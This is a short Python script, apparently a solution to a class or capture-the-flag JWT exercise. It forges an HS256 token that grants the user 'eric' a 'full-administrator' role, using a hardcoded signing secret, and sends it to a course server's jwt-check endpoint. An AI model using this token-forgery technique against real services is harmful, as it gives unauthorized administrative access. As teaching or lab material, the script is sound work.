#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.11"
# dependencies = [
#  "pyjwt"
# ]
# ///

import sys
import urllib.error
import urllib.request
import urllib.parse
import jwt

BASE_URL = "http://class.nsc.aoeu.com/d/jwt-check"

def main():
    username = "eric"
    secret_key = "JTukPO7_i3T7hy3CqArgMNiCENlxTlFdQ9oqz-z4QQo"

    payload = {
        "username": username,
        "roles": ["full-administrator"],
    }

    jwt_token = jwt.encode(payload, secret_key, algorithm="HS256")

    params = urllib.parse.urlencode({'jwt': jwt_token})
    url = f"{BASE_URL}?{params}"

    try:
        with urllib.request.urlopen(url) as response:
            result = response.read().decode('utf-8')
            print(result)
    except urllib.error.HTTPError as e:
        print(f"HTTP Error {e.code}: {e.reason}")
        print("\nResponse body:")
        error_body = e.read().decode('utf-8')
        print(error_body)
        sys.exit(1)

if __name__ == "__main__":
    main()
